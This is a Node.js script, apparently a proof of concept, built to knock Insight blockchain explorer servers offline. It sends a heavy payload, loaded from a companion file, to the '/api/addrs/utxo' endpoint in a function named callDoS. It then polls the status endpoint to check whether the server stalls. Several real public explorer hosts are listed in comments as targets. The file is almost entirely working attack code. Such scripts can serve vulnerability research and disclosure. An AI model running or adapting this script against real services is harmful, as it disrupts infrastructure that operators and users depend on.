const https = require('https')
const fs = require('fs')
const path = require('path')

const insightURL = null
// const insightURL = 'https://insight.bitpay.com'
// const insightURL = 'https://ravencoin.network'
// const insightURL = 'https://blockdozer.com'
// const insightURL = 'https://digiexplorer.info'

async function makeRequest (url, opts, data) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, opts)
    req.on('error', reject)
    req.on('timeout', () => {
      req.abort()
      reject(new Error('Timeout error'))
    })
    req.on('response', (resp) => {
      if (resp.statusCode !== 200) {
        return reject(new Error(resp.statusMessage))
      }

      const chunks = []
      resp.on('data', (chunk) => chunks.push(chunk))
      resp.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')))
    })

    req.end(data)
  })
}

async function getBestBlockHash (timeout) {
  try {
    const data = await makeRequest(`${insightURL}/api/status?q=getBestBlockHash`, { timeout })
    return JSON.parse(data).bestblockhash
  } catch (err) {
    if (err.message === 'Timeout error') return 'Timeout'

    throw err
  }
}

let callDoSId = 0
const callDoSBody = fs.readFileSync(path.join(__dirname, `${path.parse(__filename).name}-body.json`), 'utf-8').trim()
async function callDoS () {
  const id = ++callDoSId
  log(`Start DoS call id#${id}`)
  const ts = diffTime()
  try {
    const headers = { 'Content-Type': 'application/json' }
    await makeRequest(`${insightURL}/api/addrs/utxo`, { method: 'POST', headers }, callDoSBody)
  } catch (err) {
    log(`DoS call id#${id} error: ${err.message}`)
  }
  log(`DoS call id#${id} done in ${diffTime(ts).toFixed(2)}ms`)
}

function log (msg) {
  console.log(`${new Date().toISOString()} ${msg}`)
}

function diffTime (time) {
  if (time === undefined) return process.hrtime()

  const diff = process.hrtime(time)
  return diff[0] * 1e3 + diff[1] / 1e6
}

async function delay (ms) {
  await new Promise((resolve) => setTimeout(resolve, ms).unref())
}

;(async () => {
  const count = 1
  const dos = Promise.all(new Array(count).fill(null).map(async (x, i) => {
    await delay(i * 200)
    await callDoS()
  })).then(() => 'done')

  const getStatus = async (timeout) => {
    const ts = diffTime()
    const hash = await getBestBlockHash(timeout)
    const diff = diffTime(ts)
    log(`Best hash: ${hash} (${diff.toFixed(2)}ms)`)
    return diff
  }

  while (true) {
    const callTimeout = 3000
    const elapsed = await getStatus(callTimeout)

    const timeout = Math.max(100, callTimeout - elapsed)
    const st = await Promise.race([dos, delay(timeout)])
    if (st === 'done') break
  }

  await getStatus(30000)
})().catch((err) => {
  console.error(err.stack || err)
  process.exit(1)
})
